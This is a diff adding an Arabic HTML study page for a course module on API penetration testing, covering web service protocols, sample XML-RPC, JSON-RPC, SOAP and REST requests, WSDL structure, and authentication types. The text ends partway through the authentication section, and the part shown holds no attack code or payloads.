@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>eWPTXv3 · Module 04: اختبار اختراق APIs</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,.10);--red-border:rgba(225,54,47,.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,.09);--amber-border:rgba(232,162,58,.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,.09);--green-border:rgba(63,191,110,.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,.09);--blue-border:rgba(78,161,211,.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,.10);--purple-border:rgba(161,121,232,.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{--bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;--border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background .2s,color .2s;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width .08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,.5);transition:transform .15s,border-color .15s,opacity .2s;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}#toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,.03);transition:background .15s;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-line-g{stroke:var(--green);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-g{fill:var(--green);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls"><button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button></div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">student@ewptx:~/module-04$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">eWPTXv3 · API Penetration Testing · Module 04</span>
+    <h1>اختبار اختراق APIs</h1>
+    <p class="lede">من أساسيات Web Services وAPIs، لبروتوكولات XML-RPC وJSON-RPC وSOAP وREST، لـ WSDL Disclosure واختبار المصادقة وJWT، وصولاً لثغرات SQL Injection وCommand Injection في الـ APIs.</p>
+    <div class="tags">
+      <span class="tag">web-services</span>
+      <span class="tag">rest-api</span>
+      <span class="tag">soap</span>
+      <span class="tag">wsdl</span>
+      <span class="tag">jwt</span>
+      <span class="tag">token-auth</span>
+      <span class="tag">api-injection</span>
+      <span class="tag">owasp-wstg</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#intro"><span class="toc-num">00</span><span>مقدمة — Web Services وAPIs والفرق بينهم</span></a>
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>تطبيقات الـ Web Services — XML-RPC وJSON-RPC وSOAP وREST</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>WSDL — لغة وصف خدمات الويب ومكوّناتها</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>آليات المصادقة وOWASP WSTG</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>Token-Based Authentication وJSON Web Tokens</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>WSDL Disclosure وMethod Enumeration</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>ثغرات الـ Injection في الـ APIs</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ INTRO -->
+<h1 id="intro">Module 04: اختبار اختراق APIs</h1>
+<p>Web Services هي مكوّنات برمجية صُمِّمت لتسهيل التواصل وتبادل البيانات بين التطبيقات المختلفة عبر الإنترنت — تتيح للتطبيقات المتباينة التعاون حتى لو كانت على منصات أو لغات مختلفة أو خوادم مختلفة.</p>
+
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>فهم بنية وأنواع APIs — REST وSOAP وGraphQL</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>التعرّف على مخاطر أمن الـ APIs الشائعة وتأثيرها</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>تطبيق منهجية منظَّمة لاختبار اختراق الـ APIs</span></div>
+  <div class="goal-card"><span class="gi">4</span><span>إجراء Reconnaissance لاكتشاف Endpoints</span></div>
+  <div class="goal-card"><span class="gi">5</span><span>اختبار آليات المصادقة وثغرات الـ JWT</span></div>
+  <div class="goal-card"><span class="gi">6</span><span>تحديد واستغلال ثغرات الـ Injection في الـ APIs</span></div>
+</div>
+
+<h3>Web Services مقابل Web Applications</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الجانب</th><th>Web Services</th><th>Web Applications</th></tr></thead>
+<tbody>
+<tr><td>الهدف</td><td>تسهيل تبادل البيانات بين التطبيقات</td><td>تقديم خدمات مباشرة للمستخدم النهائي</td></tr>
+<tr><td>تفاعل المستخدم</td><td>لا واجهة — Machine-to-Machine فقط</td><td>واجهة مستخدم سهلة للبشر</td></tr>
+<tr><td>البروتوكول</td><td>SOAP, REST, XML-RPC, JSON-RPC</td><td>HTTP/HTTPS بشكل أساسي</td></tr>
+<tr><td>تركيز الأمان</td><td>حماية البيانات أثناء النقل والتحكّم في الوصول</td><td>Authentication, Authorization, Data Validation, XSS, SQLi...</td></tr>
+<tr><td>أمثلة</td><td>PayPal API، Weather Data Services</td><td>Amazon، Gmail، Facebook</td></tr>
+</tbody>
+</table></div>
+
+<h3>Web Services مقابل APIs — الفرق الدقيق</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ الفرق الجوهري</div>
+<p><strong>Web Services:</strong> فئة أوسع من التقنيات والبروتوكولات لتسهيل التواصل وتبادل البيانات بين الأنظمة المختلفة — بتوفَّر طريقة موحَّدة للتطبيقات المختلفة للتفاعل مع بعضها.</p>
+<p><strong>APIs:</strong> مجموعة قواعد وأدوات تتيح للتطبيقات المختلفة التواصل مع بعضها. بتوفَّر وصولاً لوظائف أو بيانات تطبيق ما للمطوّرين. <strong>All Web Services are APIs, but not all APIs are Web Services.</strong></p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">تطبيقات الـ Web Services — XML-RPC وJSON-RPC وSOAP وREST</span></h2>
+
+<h3>XML-RPC</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ XML-RPC (1998)</div>
+<p>بروتوكول بسيط وخفيف لتمكين التواصل بين التطبيقات. بيعمل بإرسال HTTP Requests تستدعي method واحدة مُنفَّذة على النظام البعيد. بيشفَّر البيانات بـ XML — قابل للقراءة من البشر والآلات. يُعدّ سلفاً للـ SOAP و REST الحديثين.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">xml — xml-rpc request / response</span><pre><code>&lt;!-- REQUEST --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;sampleMethod&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;int&gt;42&lt;/int&gt;&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;
+
+&lt;!-- RESPONSE --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;Hello, World!&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre></div>
+
+<h3>JSON-RPC</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ JSON-RPC</div>
+<p>مشابه لـ XML-RPC لكن بيستخدم JSON بدل XML. أكثر قابلية للقراءة البشرية وبيأخذ بيانات أقل للتواصل. بات شائعاً في Web Development وMicroservices Architectures.</p>
+</div>
+<p>الـ Request object يحتوي ثلاث خصائص دائماً:</p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span><code>method</code>: اسم الـ Method المُستدعاة</span></div>
+  <div class="goal-card"><span class="gi">2</span><span><code>params</code>: Array من المعاملات</span></div>
+  <div class="goal-card"><span class="gi">3</span><span><code>id</code>: Request ID لمطابقة الـ Responses</span></div>
+</div>
+<div class="code-wrap"><span class="code-tag">json — json-rpc request</span><pre><code>{
+  "method": "getUserProfile",
+  "params": [{"userId": 42}],
+  "id": 1
+}
+</code></pre></div>
+
+<h3>SOAP</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ SOAP (Simple Object Access Protocol)</div>
+<p>بروتوكول لتبادل المعلومات المهيكَّلة. الخلف الطبيعي لـ XML-RPC. معروف بـ Strong Typing ومجموعة ميزات واسعة تشمل الأمان والموثوقية ودعم المعاملات. ممكن يأتي مع WSDL declaration تصف كيفية استخدامه.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">xml — soap request / response</span><pre><code>&lt;!-- SOAP REQUEST --&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soapenv:Header/&gt;
+  &lt;soapenv:Body&gt;
+    &lt;web:sampleMethod&gt;
+      &lt;web:inputParameter&gt;42&lt;/web:inputParameter&gt;
+    &lt;/web:sampleMethod&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+
+&lt;!-- SOAP RESPONSE --&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soapenv:Header/&gt;
+  &lt;soapenv:Body&gt;
+    &lt;web:sampleMethodResponse&gt;
+      &lt;web:result&gt;Hello, World!&lt;/web:result&gt;
+    &lt;/web:sampleMethodResponse&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre></div>
+
+<h3>REST (RESTful APIs)</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ REST (Representational State Transfer)</div>
+<p>REST مش بروتوكول أو تقنية — هو Architectural Style لتصميم تطبيقات الشبكة. مجموعة مبادئ وقيود توجَّه تصميم الـ Web Services والـ APIs. بيستخدم HTTP كـ Communication Protocol. بيستخدم JSON أو XML أو أي صيغة نقل رسائل.</p>
+</div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>HTTP Method</th><th>الفعل</th><th>مثال</th></tr></thead>
+<tbody>
+<tr><td><code>GET</code></td><td>استرجاع مورد أو قائمة موارد</td><td><code>GET /api/books</code> — قائمة الكتب | <code>GET /api/books/1</code> — كتاب محدَّد</td></tr>
+<tr><td><code>POST</code></td><td>إنشاء مورد جديد</td><td><code>POST /api/books</code> — إنشاء كتاب جديد</td></tr>
+<tr><td><code>PUT</code></td><td>تغيير حالة مورد أو استبداله</td><td><code>PUT /api/books/1</code> — استبدال كتاب</td></tr>
+<tr><td><code>DELETE</code></td><td>حذف مورد</td><td><code>DELETE /api/books/1</code> — حذف كتاب</td></tr>
+<tr><td><code>PATCH</code></td><td>تعديل جزئي لمورد</td><td><code>PATCH /api/books/1</code> — تعديل حقل واحد</td></tr>
+</tbody>
+</table></div>
+
+<h3>مقارنة البروتوكولات الأربعة</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>المعيار</th><th>XML-RPC</th><th>JSON-RPC</th><th>SOAP</th><th>REST</th></tr></thead>
+<tbody>
+<tr><td>صيغة البيانات</td><td>XML</td><td>JSON</td><td>XML</td><td>JSON / XML / Any</td></tr>
+<tr><td>التعقيد</td><td>بسيط</td><td>بسيط جداً</td><td>معقَّد</td><td>بسيط</td></tr>
+<tr><td>الأمان المدمج</td><td>لا</td><td>لا</td><td>WS-Security</td><td>HTTPS + OAuth</td></tr>
+<tr><td>Stateless؟</td><td>نعم</td><td>نعم</td><td>ممكن</td><td>نعم (بالتعريف)</td></tr>
+<tr><td>الاستخدام الشائع</td><td>Legacy Systems</td><td>Microservices</td><td>Enterprise/Banking</td><td>Modern Web APIs</td></tr>
+<tr><td>الوصف</td><td>—</td><td>—</td><td>WSDL</td><td>OpenAPI/Swagger</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">WSDL — لغة وصف خدمات الويب ومكوّناتها</span></h2>
+
+<h3>إيه هو WSDL؟</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ WSDL — Web Services Description Language</div>
+<p>لغة مبنية على XML لوصف وظيفة وواجهة الـ Web Service. مستندات WSDL بتعمل كعقود بين مزوَّدي الخدمة ومستهلكيها — بتحدَّد كيفية استخدام الـ Web Service. بتُستخدَم بالتوافق مع SOAP لتعريف وتوثيق الـ SOAP-based Web Services.</p>
+</div>
+
+<p>WSDL Documents بيكون ليها <strong>تعريفات مجرَّدة وملموسة:</strong></p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">A</span><span><strong>Abstract:</strong> بتصف إيه اللي الخدمة بتعمله — العمليات، المدخلات، المخرجات، ورسائل الخطأ</span></div>
+  <div class="goal-card"><span class="gi">C</span><span><strong>Concrete:</strong> بتضيف معلومات عن كيفية التواصل وأين الوظيفة متاحة</span></div>
+</div>
+
+<h3>مكوّنات WSDL الأساسية</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">Types</span>
+  <div class="mtitle">&lt;types&gt;</div>
+  <div class="mdesc">بيعرَّف أنواع البيانات المستخدَمة في الخدمة. بيضم عادةً XML Schema Definitions (XSD) تحدَّد بنية وقيود بيانات المدخلات والمخرجات.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">Message</span>
+  <div class="mtitle">&lt;message&gt;</div>
+  <div class="mdesc">بيعرَّف بنى البيانات المستخدَمة في الرسائل المتبادَلة. كل رسالة ممكن تحتوي أجزاء متعددة، كل جزء له اسم ونوع يرجع للـ Types.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">PortType</span>
+  <div class="mtitle">&lt;portType&gt; / Interface</div>
+  <div class="mdesc">بيصف العمليات التي تدعمها الخدمة. كل عملية تقابل Method أو Function ممكن للعميل يستدعيها. في WSDL 2.0 اسمه Interface.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">Binding</span>
+  <div class="mtitle">&lt;binding&gt;</div>
+  <div class="mdesc">بيحدَّد كيف عمليات الخدمة مرتبطة ببروتوكول معيّن (زي SOAP على HTTP). بيعرَّف البروتوكول وترميز الرسائل وعناوين الـ Endpoints.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">Service</span>
+  <div class="mtitle">&lt;service&gt;</div>
+  <div class="mdesc">بيوفَّر معلومات عن الخدمة نفسها: الاسم وعنوان الـ Endpoint (الـ URL اللي العملاء يصلوا منه للخدمة).</div>
+</div>
+<div class="method-card">
+  <span class="mnum">Operation</span>
+  <div class="mtitle">&lt;operation&gt;</div>
+  <div class="mdesc">بيمثَّل فعل محدَّد تقدر الخدمة تنفَّذه. بيحدَّد اسم العملية وبنية الـ Input/Output Messages وأي Fault Messages ممكن تحصل.</div>
+</div>
+</div>
+
+<div class="callout note">
+<div class="callout-label">📌 WSDL 1.1 vs 2.0</div>
+<p><strong>WSDL 1.1:</strong> يستخدم <code>portType</code>، <code>message</code>، و<code>types</code>. لا يزال الأكثر انتشاراً رغم قِدَمه.<br/>
+<strong>WSDL 2.0:</strong> يستبدل <code>portType</code> بـ <code>interface</code>، أزال عنصر <code>message</code> — الـ interface elements بتشير مباشرة لعناصر الـ Schema.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">آليات المصادقة وOWASP WSTG</span></h2>
+
+<h3>أنواع آليات المصادقة</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">01</span>
+  <div class="mtitle">🔑 Password-Based</div>
+  <div class="mdesc">المستخدم يقدَّم Username وPassword للتحقق من الهوية. الأسلوب التقليدي — الأكثر شيوعاً والأضعف أمنياً لوحده.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">02</span>
+  <div class="mtitle">📱 MFA — Multi-Factor</div>
+  <div class="mdesc">يجمع عاملين أو أكثر: شيء تعرفه (كلمة مرور)، شيء تملكه (جهاز/Token)، شيء أنت عليه (Biometric).</div>
+</div>
+<div class="method-card">
+  <span class="mnum">03</span>
+  <div class="mtitle">📲 2FA — Two-Factor</div>
+  <div class="mdesc">نوع محدَّد من MFA يتطلَّب عاملين بالضبط — غالباً كلمة مرور + OTP عبر SMS أو Authenticator App.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">04</span>
+  <div class="mtitle">🎫 Token-Based</div>
